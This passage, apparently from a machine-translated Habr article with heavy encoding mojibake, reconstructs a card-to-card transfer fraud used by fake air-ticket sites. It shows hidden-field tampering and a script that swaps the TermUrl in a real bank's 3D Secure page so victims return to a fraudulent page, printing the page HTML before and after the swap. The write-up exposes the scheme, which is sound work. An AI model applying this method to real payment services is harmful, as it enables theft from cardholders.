<li>     â€”   ,  type=Â«hiddenÂ».      type=Â«textÂ».</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans notre cas, les champs du formulaire sont masquÃ©s en utilisant type = "hidden". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous appuyons sur le navigateur F12 (mode de dÃ©veloppement web). Trouvez le bon endroit dans le code HTML et changez le type de texte = "cachÃ©" en type = "texte" pour deux Ã©lÃ©ments d'entrÃ©e ou plus. Nous voyons maintenant les champs dans lesquels la somme et le code de service (code) sont stockÃ©s. RÃ©duisez la quantitÃ© de 2915rub Ã  20rub. Saisissez maintenant les donnÃ©es de votre deuxiÃ¨me carte bancaire dans le formulaire. L'argent doit Ãªtre dÃ©bitÃ© de cette carte s'il est possible d'effectuer un virement. </font></font><br>
<br>
<img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous confirmons le formulaire en cliquant sur le bouton "Payer". AprÃ¨s avoir cliquÃ© sur le bouton, le script payp2p.php est lancÃ©, qui reÃ§oit les donnÃ©es saisies dans le formulaire.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã€ ma grande surprise, aprÃ¨s avoir entrÃ© le vrai numÃ©ro de carte et cliquÃ© sur le bouton Â«PayerÂ» du formulaire de test, j'ai vu la page de la Sberbank (la banque Ã  partir de laquelle le transfert est effectuÃ©) Ã  l'Ã©cran, me demandant d'entrer le code de confirmation 3D Secure. </font></font><br>
<br>
<img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sur mon tÃ©lÃ©phone, j'ai Ã©galement reÃ§u un SMS de Sberbank avec un code.</font></font><br>
<br>
<img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de tester avec une carte de crÃ©dit valide, je supposais que pour confirmer le code 3D Secure, il devait Ãªtre Â«trompÃ©Â» d'une maniÃ¨re ou d'une autre par l'utilisateur, puis transfÃ©rer secrÃ¨tement par programmation la confirmation 3D Secure Ã  ce formulaire. Cependant, tout s'est avÃ©rÃ© beaucoup plus simple. Une fois les donnÃ©es de transfert de carte Ã  carte envoyÃ©es sur le site Web de Promsvyazbank, le navigateur affiche le formulaire de la banque Ã©mettrice de la carte Ã  partir de laquelle le transfert est effectuÃ©. Dans mon cas, c'est Sberbank. Cette forme n'a mÃªme pas besoin d'Ãªtre truquÃ©e. Le formulaire de confirmation est affichÃ© sur le site Web HTTPS de Sberbank. Les victimes de fraudeurs elles-mÃªmes directement dans ce formulaire qui leur sont familiers saisissent un code de confirmation. AprÃ¨s cela, si le transfert rÃ©ussit, l'argent est dÃ©bitÃ©. Bien qu'il soit thÃ©oriquement possible de protester contre un tel transfert, il est loin que l'argent soit restituÃ©.La probabilitÃ© d'un remboursement est affectÃ©e par de nombreux facteurs, notamment la rapiditÃ© avec laquelle la Â«victimeÂ» s'adressera Ã  sa banque.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Code HTML de la page que Sberbank distribue pour confirmer 3D Secure sous le spoiler. </font><font style="vertical-align: inherit;">Le code a Ã©tÃ© obtenu lors des tests en Ã©crivant la variable $ page dans un fichier texte. </font><font style="vertical-align: inherit;">Ligne 166 du script payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code de page HTML 3D sÃ©curisÃ© avant le remplacement de ligne</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Code HTML de la page aprÃ¨s avoir remplacÃ© une partie du texte, sous le spoiler. </font><font style="vertical-align: inherit;">Le code a Ã©tÃ© obtenu lors des tests en Ã©crivant la variable $ pp dans un fichier texte. </font><font style="vertical-align: inherit;">Ligne 174 du script payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code de page HTML 3D sÃ©curisÃ© aprÃ¨s remplacement d'une chaÃ®ne</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En bref, dans le code HTML de la page 3D Secure (dans cet exemple, de Sberbank) la ligne:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Modifie par programme:</font></font><br>
 <br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La chaÃ®ne de remplacement est l'adresse de la page vers laquelle la carte bancaire Ã©mettrice de l'expÃ©diteur aprÃ¨s vÃ©rification du code 3D Secure doit renvoyer l'utilisateur. Avant que le script ne remplace la ligne, le site Web de Promsvyazbank Ã©tait spÃ©cifiÃ© comme adresse de retour. Une fois que le script a remplacÃ© la ligne, une page du site frauduleux est dÃ©jÃ  indiquÃ©e comme adresse de retour.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je ne comprends pas complÃ¨tement Ã  quel moment prÃ©cis l'adresse de retour est remplacÃ©e, mais cela fonctionne. Ã€ ce moment, lorsque le navigateur affiche la page https de Sberbank avec une demande de saisie du code 3D Secure, si vous regardez le code HTML source de la page dans le navigateur, il n'y a d'adresse de retour vers aucun site. Le code HTML de cette page a une longueur de plus de 400 lignes et est complÃ¨tement diffÃ©rent du code HTML de la page de rÃ©ponse de Sberbank prÃ©sentÃ© ci-dessus, qui a Ã©tÃ© capturÃ© en Ã©crivant les variables $ page (ligne 166) et $ pp (ligne 174) sur le disque.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous entrez le mauvais code 3D Secure, Sberbank sur sa page affiche un message indiquant que le code est incorrect et envoie un autre SMS. DÃ¨s que le bon code est entrÃ©, il est redirigÃ© vers le site de paiement ou vers le site de remplacement. Autrement dit, la redirection vers le site de paiement lui-mÃªme implique que depuis Sberbank toutes les procÃ©dures nÃ©cessaires ont Ã©tÃ© accomplies. Sberbank sert ici d'exemple pour les tests. Le virement peut Ã©galement Ãªtre effectuÃ© via une autre banque.</font></font><br>
<br>
<img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Du cÃ´tÃ© de l 'Â«acheteur de billetsÂ», cela ressemble Ã  ceci. L'acheteur sur un mode de paiement prÃ©-Ã©tabli entre son numÃ©ro de carte. AprÃ¨s cela, la page de confirmation du code 3D Secure s'affiche presque immÃ©diatement et un SMS avec un code de confirmation arrive. La page 3D Secure du navigateur s'affiche sur le site Internet de la banque de l'Ã©metteur de la carte de l'acheteur Ã  l'aide du protocole HTTPS. La page avec le formulaire de saisie du numÃ©ro de carte peut sembler suspecte, mais la confirmation de 3D Secure sur le site Internet de votre banque ne suscite aucun doute ni suspicion. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Soit dit en passant, faites attention Ã  la signature Â«ticket payÂ» dans la ligne Â«DescriptionÂ» sur la page 3D Secure de Sberbank. Cette signature est dÃ©finie dans le script payp2p.php. Dans de futurs exemples, nous essaierons de le changer. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Revenons aux tests.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai entrÃ© le code de SMS sur la page Sberbank et aprÃ¨s avoir cliquÃ© sur le bouton Â«EnvoyerÂ», j'ai reÃ§u un avertissement que les donnÃ©es seraient envoyÃ©es via une connexion non sÃ©curisÃ©e. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
AprÃ¨s avoir confirmÃ© que j'Ã©tais d'accord avec l'envoi de donnÃ©es via une connexion non sÃ©curisÃ©e, j'ai Ã©tÃ© redirigÃ© vers la </font></font><br>
<br>
<img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
page </font><font style="vertical-align: inherit;">/sus.php?cd=â€¦ </font><font style="vertical-align: inherit;">. Il s'agit de la page de retour. L'adresse de retour est dÃ©finie dans le script. Dans ce cas, la page est introuvable. Mais la raison est claire - la page de retour n'a pas Ã©tÃ© prÃ©parÃ©e Ã  l'avance. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien que l'objectif ait Ã©tÃ© presque atteint, l' </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argent d'une carte Ã  l'autre ne passait vraiment pas</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Il n'y a pas eu de sms supplÃ©mentaires indiquant que le paiement a Ã©tÃ© refusÃ©, etc.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai dÃ©cidÃ© que la raison de l'Ã©chec lors de la premiÃ¨re tentative Ã©tait que le site local (localhost) fonctionnait sur une connexion http non sÃ©curisÃ©e et le site Sberbank sur un protocole http sÃ©curisÃ©. Http et https ne sont pas trÃ¨s amicaux l'un avec l'autre. Cela explique d'ailleurs pourquoi les sites frauduleux dÃ©crits dans la premiÃ¨re partie de la publication ont utilisÃ© une connexion https sÃ©curisÃ©e, bien qu'avec le certificat le plus simple. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour vÃ©rifier cette hypothÃ¨se, j'ai dÃ» configurer le protocole https sur le site local. Pour ce faire, un domaine local p2p.localhost et un certificat auto-signÃ© ont Ã©tÃ© crÃ©Ã©s. En consÃ©quence, la nouvelle adresse avec le script de test a commencÃ© Ã  ressembler Ã  ceci: De </font></font><br>
<br>
<code>https://p2p.localhost/payp2p.php</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
plus, l'adresse de la page Ã  laquelle le retour doit Ãªtre effectuÃ© aprÃ¨s avoir entrÃ© le code 3D Secure a Ã©tÃ© modifiÃ©e dans le script. La page de retour elle-mÃªme a Ã©galement Ã©tÃ© prÃ©parÃ©e.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous essayons Ã  nouveau d'effectuer un paiement dÃ©jÃ  avec un site local qui fonctionne via le protocole https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lorsque vous vous connectez pour la premiÃ¨re fois, le navigateur ne jure que par la connexion sÃ©curisÃ©e mal configurÃ©e. Cela est dÃ» au fait que nous avons un certificat auto-signÃ©. </font></font><br>
<br>
<img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La source du certificat Ã©tant connue, nous l'ajoutons aux exceptions. </font></font><br>
<br>
<img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Câ€™est tout. Maintenant, la connexion est Ã©tablie via https et lors du passage du site Web de la Sberbank, les avertissements disparaissent. </font></font><br>
<br>
<img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
AprÃ¨s avoir saisi le code 3D Secure, le retour Ã  la page spÃ©cialement prÃ©parÃ©e s'effectue correctement. </font></font><br>
<br>
<img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout fonctionne bien sauf </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">que l'argent ne fonctionne pas vraiment</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . En consÃ©quence, j'ai dÃ» tester et rechercher pendant plusieurs jours, quelle pourrait Ãªtre la raison.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je n'avais qu'une partie des fichiers utilisÃ©s sur l'un des sites de billets d'avion frauduleux. Parmi les fichiers qui m'ont Ã©tÃ© envoyÃ©s, il y avait un fichier payment.php. Ceci est similaire au script analysÃ© ci-dessus. A en juger par le code, il a probablement Ã©tÃ© crÃ©Ã© non pas pour tromper les visiteurs sur le "site de combat", mais pour tester par un programmeur-dÃ©veloppeur la possibilitÃ© de transfÃ©rer d'une carte Ã  une autre via le service 3ds.payment.ru. C'est peu probable, mais thÃ©oriquement dans les premiÃ¨res versions de sites frauduleux, il pourrait Ãªtre utilisÃ© non seulement pour des tests. </font></font><br>
<br>
